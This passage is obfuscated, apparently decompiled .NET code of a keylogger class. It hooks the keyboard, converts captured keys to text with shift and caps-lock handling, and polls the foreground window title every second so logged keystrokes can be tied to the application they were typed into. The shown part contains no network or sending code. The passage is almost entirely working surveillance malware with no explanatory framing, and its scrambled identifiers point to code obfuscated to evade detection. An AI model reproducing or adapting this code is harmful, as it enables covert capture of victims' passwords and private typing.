            // ISSUE: reference to a compiler-generated field
            \uFFFDٗ\u05C3\uFFFDc.KeyLoggerEventArgsEventHandler keyUpEvent = this.KeyUpEvent;
            if (keyUpEvent != null)
              keyUpEvent((object) this, new \uFFFDٗ\u05C3\uFFFDc.KeyLoggerEventArgs(key, this.Identifykey(key)));
          }
        }
        return \uFFFDٗ\u05C3\uFFFDc.KeyLogger.CallNextHook(this._hook, code, direction, ref key);
      }

      private string Identifykey(Keys k)
      {
        bool flag = ʓ\uD95F\uDC77Śޤ.\u060CҚ쐬\u0385ٷ.Keyboard.ShiftKeyDown;
        if (ʓ\uD95F\uDC77Śޤ.\u060CҚ쐬\u0385ٷ.Keyboard.CapsLock)
          flag = !flag;
        string str;
        try
        {
          switch (k)
          {
            case Keys.Back:
            case Keys.End:
            case Keys.Delete:
            case Keys.F1:
            case Keys.F2:
            case Keys.F3:
            case Keys.F4:
            case Keys.F5:
            case Keys.F6:
            case Keys.F7:
            case Keys.F8:
            case Keys.F9:
            case Keys.F10:
            case Keys.F11:
            case Keys.F12:
              str = "[" + k.ToString() + "]";
              break;
            case Keys.Tab:
              str = "[TAP]";
              break;
            case Keys.Return:
              str = "[ENTR]";
              break;
            case Keys.Space:
              str = " ";
              break;
            default:
              str = !flag ? this.VKCodeToUnicode(checked ((uint) k)) : this.VKCodeToUnicode(checked ((uint) k)).ToUpper();
              break;
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          if (flag)
          {
            str = Strings.ChrW((int) k).ToString().ToUpper();
            ProjectData.ClearProjectError();
          }
          else
          {
            str = Strings.ChrW((int) k).ToString().ToLower();
            ProjectData.ClearProjectError();
          }
        }
        return str;
      }

      private string VKCodeToUnicode(uint VKCode)
      {
        try
        {
          StringBuilder 똛ۚ蠺Ɯٚ = new StringBuilder();
          byte[] numArray = new byte[(int) byte.MaxValue];
          if (!\uFFFDٗ\u05C3\uFFFDc.\uFFFDߡŔԌ\u0609(numArray))
            return "";
          uint num1 = \uFFFDٗ\u05C3\uFFFDc.Ԍ\uFFFD\uFFFDУ\uFFFD(VKCode, 0U);
          IntPtr num2 = \uFFFDٗ\u05C3\uFFFDc.ҟOεή츠();
          int num3 = 0;
          IntPtr num4 = (IntPtr) \uFFFDٗ\u05C3\uFFFDc.\uFFFDʓ\uFFFD嵱ë(\uFFFDٗ\u05C3\uFFFDc.\uFFFD\uFFFDΑm똛(num2, ref num3));
          \uFFFDٗ\u05C3\uFFFDc.Օ\u002D\uD81D\uDDCFɮ(VKCode, num1, numArray, 똛ۚ蠺Ɯٚ, 5, 0U, num4);
          return 똛ۚ蠺Ɯٚ.ToString();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        return ((Keys) checked ((int) VKCode)).ToString();
      }

      private void InitializeCaptionLogging() => new Thread((ThreadStart) (() =>
      {
        while (true)
        {
          StringBuilder stringBuilder = new StringBuilder(256);
          if (\uFFFDٗ\u05C3\uFFFDc.\u0306ۣٚ泮Ң(\uFFFDٗ\u05C3\uFFFDc.ҟOεή츠(), stringBuilder, 256) > 0 && Operators.CompareString(stringBuilder.ToString(), this._currentWindow, false) != 0)
            this._currentWindow = stringBuilder.ToString();
          Thread.Sleep(1000);
        }
      })).Start();

      public void Dispose()
      {
        \uFFFDٗ\u05C3\uFFFDc.KeyLogger.UnHook(this._hook);
        GC.SuppressFinalize((object) this);
      }

      private delegate int KeyboardProc(int code, int direction, ref Keys key);
    }
  }
}
